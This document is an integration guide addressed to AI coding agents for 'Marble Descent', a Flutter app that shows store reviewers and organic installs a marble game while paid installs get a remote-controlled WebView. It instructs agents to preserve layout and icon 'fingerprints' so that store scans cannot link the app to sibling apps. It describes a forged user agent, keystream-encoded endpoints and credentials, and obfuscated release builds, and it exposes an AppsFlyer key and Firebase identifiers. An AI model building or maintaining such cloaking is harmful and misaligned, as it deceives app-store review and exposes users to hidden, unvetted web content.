# Marble Descent — Gray-Flow Integration Guide
## For AI agents working on this project

---

## What the app is

Marble Descent is a dual-mode Flutter app:

- **Shell mode (online / non-organic):** full-screen WebView loading a URL
  received from `marbledescent.com/config.php`.
- **Native mode (organic):** the neon marble arcade game (see
  `lib/screens/`, `lib/models/`, `lib/services/game_storage.dart`).

The backend routes users based on **AppsFlyer attribution**. Organic
installs get the game (that's what store reviewers see); paid installs
get the WebView.

---

## Project layout (deliberately unique per project)

```
lib/
├── main.dart                          Bootstrap: Firebase, AppCheck, relays, runApp
├── theme.dart                         Existing neon theme (colors, buttons, borders)
├── orbit/
│   ├── orbit_app.dart                 Root MaterialApp — passes relays to the pilot
│   ├── route_pilot.dart               ★ CORE: loading screen + shell/native routing
│   └── asset_book.dart                Centralised veil (shell) asset paths
├── nexus/
│   ├── identity.dart                  MarbleIdentity: bundle id, endpoints, timings
│   └── public_links.dart              Privacy / support / homepage (plain-text)
├── glyph/
│   ├── glyph_codec.dart               Keystream unweave() decoder
│   └── glyph_pack.dart                Encoded endpoints + credentials (byte arrays)
├── echo/
│   ├── verdict_echo.dart              Config response model {ok, url, expires, message}
│   └── runtime_mode.dart              shell / native / fresh enum
├── relays/
│   ├── ua_stamp.dart                  Forged device UA http client (marbleWire)
│   ├── net_probe.dart                 Connectivity + DNS reachability
│   ├── local_store.dart               Shell persistence (prefs + secure storage)
│   ├── attribution_relay.dart         AppsFlyer SDK + GCD organic-retry
│   ├── verdict_relay.dart             POST config, cache destination + expiry
│   └── push_relay.dart                FCM + local notification bridge
├── veil/
│   ├── web_veil.dart                  ★ CORE: WebView shell (with all JS mends)
│   ├── invite_veil.dart               Push permission promo (Accept / Skip)
│   └── offline_veil.dart              No-Wi-Fi screen (Retry button)
├── mint/
│   └── slate_button.dart              Shared shell button (stadium pill)
├── screens/                           ← Native game (unchanged)
├── models/                            ← Native game data (unchanged)
├── services/game_storage.dart         ← Native game storage (unchanged)
└── game/                              ← (may or may not exist depending on layout)

tool/
└── glyph_packer.dart                  Run to encode secrets → byte arrays

android/app/
├── build.gradle.kts                   applicationId, targetSdk=35, compileSdk=36
├── google-services.json               ★ Firebase config (kept out of source)
└── src/main/
    ├── AndroidManifest.xml            OneLink host, FCM channel, POST_NOTIFICATIONS
    ├── kotlin/com/marbdesc/marbledescent/MainActivity.kt   File-upload MethodChannel
    └── res/drawable/ic_notification.xml   Monochrome flame vector
```

**Do NOT rename these folders to match another project.** Marble
Descent's fingerprint IS this layout — reusing the folder tree from a
sibling app would create a cluster in store scans.

---

## Key identifiers

| Field                         | Value                                          |
| ----------------------------- | ---------------------------------------------- |
| bundle / applicationId        | `com.marbdesc.marbledescent`                   |
| display name                  | `Marbale Descent`                              |
| homepage                      | `https://marbledescent.com`                    |
| privacy URL                   | `https://marbledescent.com/privacy-policy.html`|
| support URL                   | `https://marbledescent.com/support.html`       |
| verdict (config) endpoint     | `https://marbledescent.com/config.php`         |
| OneLink host                  | `marbledescent.onelink.me`                     |
| notification channel id       | `marble_dispatch_channel`                      |
| method channel (file upload)  | `marbdesc/picker_bridge`                       |
| codec seed                    | `mB!7pQrN9x_marb149` (span=34)                 |
| Chrome UA fragment            | `149.0.7220.24`                                |
| WebKit UA fragment            | `537.36`                                       |
| AppsFlyer dev key             | `TAL6RnmCGYEgUQGPMrTwU` (encoded in glyph_pack)|
| Firebase project number       | `504784246070` (encoded in glyph_pack)         |
| Firebase project id           | `marble-descent`                               |
| Firebase mobile app id        | `1:504784246070:android:c132433b0fc1e0a7be8f97`|
| OneLink template id           | `CDuo` (path prefix)                           |

When the manager delivers AppsFlyer key + Firebase project number:

1. Paste them into the plaintext constants in `tool/glyph_packer.dart`.
2. Run `dart run tool/glyph_packer.dart`.
3. Replace the two empty arrays in `lib/glyph/glyph_pack.dart` with the
   printed output.
4. Drop `android/app/google-services.json` into place (do NOT commit).

---

## Boot state machine

```
RuntimeMode.fresh (FIRST LAUNCH)
  ├── no internet → OfflineVeil (frame 1)
  │      └── Retry → RoutePilot rebuilds
  └── has internet
        ├── attribution.kindle()
        ├── await [awaitInstall (30 s), awaitDeepLink (5 s)]
        │      ⚠️ af_status == "Organic" → wait 5 s + GCD refresh
        ├── verdicts.ask(body)
        ├── approved + destination  → mode=shell → WebVeil (via InviteVeil)
        └── rejected                → mode=native (ONLY if received response)
                                       → MenuScreen
              ⚠️ Network failure MUST NOT commit mode=native.

RuntimeMode.shell (RETURNING, WAS WEBVIEW)
  ├── no internet → OfflineVeil
  ├── cold-tap push link present → consume + WebVeil(pushUrl)  [HIGHEST PRIORITY]
  ├── attribution.kindle() (10 s await)
  ├── verdicts.ask(body)
  │       approved+destination → WebVeil(new destination)   ← LIVE URL wins
  │       rejected + cached    → WebVeil(cached)
  │       otherwise             → OfflineVeil

RuntimeMode.native (RETURNING, WAS GAME)
  └── straight to MenuScreen (no network)
```

Details for each branch live in
`lib/orbit/route_pilot.dart` — read that file end-to-end before
altering ANY branch. The comments encode the invariants.

---

## Backend contract

- **Endpoint:** POST `https://marbledescent.com/config.php`
- **Headers:** `Content-Type: application/json`
- **Timeout:** 15 s
- **Body:** merged from AppsFlyer install-data → deep-link → app-open,
  plus the seven device-side fields:
  `af_id, bundle_id, os, store_id, locale, push_token, firebase_project_id`
  (push_token / firebase_project_id are OMITTED, never null/empty).
- **Response:** `{ ok: true, url: "...", expires: 1712345678 }` (shell)
                or `{ ok: false, message: "organic" }` (native).

Never rename / drop fields from the AppsFlyer payload — the backend
parses the whole thing. See `AttributionRelay.composeVerdictBody`.

---

## Push notification rules

- Channel id: `marble_dispatch_channel` (matches
  `com.google.firebase.messaging.default_notification_channel_id`)
- Small icon: `@drawable/ic_notification` (flame vector, monochrome,
  distinct silhouette from the launcher icon)
- Permission dialog: **only** requested from `InviteVeil` Accept
- Cool-down after Skip: 3 days (`MarbleIdentity.inviteSkipCooldown`)
- OS-denied flag: `LocalStore.markPushOsDenied()` — stops the invite
  screen from looping when Android will silently ignore requests
- Cold-tap → `LocalStore.stashColdPush(url)` (consumed on next boot)
- Warm-tap → `pushRelay.onLink?.call(url)` (NOT saved)

---

## WebVeil (the WebView shell) — invariants

Read `lib/veil/web_veil.dart` for details. Never break any of:

1. `resizeToAvoidBottomInset: false` — the JS scroll fix owns the IME
   inset. Letting Flutter also resize causes visible jitter.
2. `SafeArea(bottom: false)` around the WebViewWidget — keeps content
   away from the camera notch in BOTH orientations.
3. `scrollIntoView({ behavior: 'auto' })` — never `'smooth'`
   (fights the keyboard animation).
4. `viewport-fit=contain` patcher (`_neutraliseSafeArea`) — must
   `return` when the keyboard is open, otherwise it forces a mid-anim
   WKWebView layout.
5. On DNS / disconnect errors, cover the WebView with a spinner
   `setState(() => _spinner = true)` **before** doing anything else —
   otherwise the native Android error page flashes.
6. On connectivity drops (`ConnectivityResult.none`), open the offline
   veil after a 700 ms debounce — absorbs VPN toggles / handoffs.
7. `_web.setUserAgent(marbleWire.stamp)` — same UA as the HTTP client.
8. `_web.setMediaPlaybackRequiresUserGesture(false)` — inline autoplay.
9. `cookies.setAcceptThirdPartyCookies(a, true)` — OAuth / payments.
10. External schemes (`tel:`, `mailto:`, `intent:`, `market:` etc.) go
    to `launchUrl(..., LaunchMode.externalApplication)`.

---

## Custom screen artwork

All shell screens use dedicated background assets, orientation-aware:

- Loading:   `assets/marbledesc_veil/Vertical_Loading_Screen.webp` /
             `.../Horizontal_Loading_Screen.webp`
- No-Wi-Fi:  `.../Vertical_Nowifi_Screen.webp` /
             `.../Horizontal_Nowifi_Screen.webp`
- Push:      `.../Vertical_Notifications_Screen.webp` /
             `.../Horizontal_Notifications_Screen.webp`

Paths are centralised in `lib/orbit/asset_book.dart`. Do NOT reference
these files directly from widgets — always go through `AssetBook`.

The push-invite screen shows an **Accept** stadium pill and a **Skip**
ghost button on top of the artwork. Both use `SlatePillButton` /
`SlateGhostButton` from `lib/mint/slate_button.dart`. No text-only
"skip" link — a proper button is required.

---

## Pitfalls to avoid

- **Never upgrade `file_picker` beyond 8.x.** This project doesn't use
  it — the native file chooser is bridged over `marbdesc/picker_bridge`
  in `MainActivity.kt`. If someone adds file_picker, pin to `8.1.4`.
- **`compileSdk = 36`** in `android/app/build.gradle.kts` — required
  by `androidx.core:1.18.0` and `androidx.browser:1.9.0`.
- **AGP 8.9.3+** in `android/settings.gradle.kts` — same reason.
- **`kotlin.incremental=false`** in `android/gradle.properties` —
  required when the pub cache (C:) and project (D:) are on different
  Windows drives.
- **`coreLibraryDesugaring`** enabled — required by
  `flutter_local_notifications` for `java.time.*` on API < 26.
- **Verdict endpoint failure MUST NOT commit `RuntimeMode.native`** —
  see the `_looksLikeNetworkError` guard in `route_pilot.dart`.
- **`push_token` / `firebase_project_id`** MUST be omitted from the
  body when unavailable — never sent as empty strings.
- **Notification icon MUST be a flame** and MUST differ in silhouette
  from the launcher icon (fingerprint safety).

---

## Testing

Test tracking link (add your GAID to AppsFlyer Test Devices first):

```
https://app.appsflyer.com/com.marbdesc.marbledescent?pid=Test%20Source&c=...&af_sub1=...&advertising_id=<your-GAID>
```

Or use the OneLink at `marbledescent.onelink.me` with equivalent
params. Install → WebView opens with `web.team-s.club` (or whatever
the manager configures on the backend).

Organic install: install directly without a tracking link → the game
opens.

---

## Release build

```powershell
cd android; .\gradlew.bat --stop; cd ..
flutter clean
Remove-Item android\app\src\main\java\io\flutter\plugins\GeneratedPluginRegistrant.java -ErrorAction SilentlyContinue
flutter pub get
flutter build apk --release --obfuscate --split-debug-info=build\debug_info
flutter build appbundle --release --obfuscate --split-debug-info=build\debug_info
```

Do NOT commit `build/debug_info/`, `google-services.json`, or
`keystore.properties`.
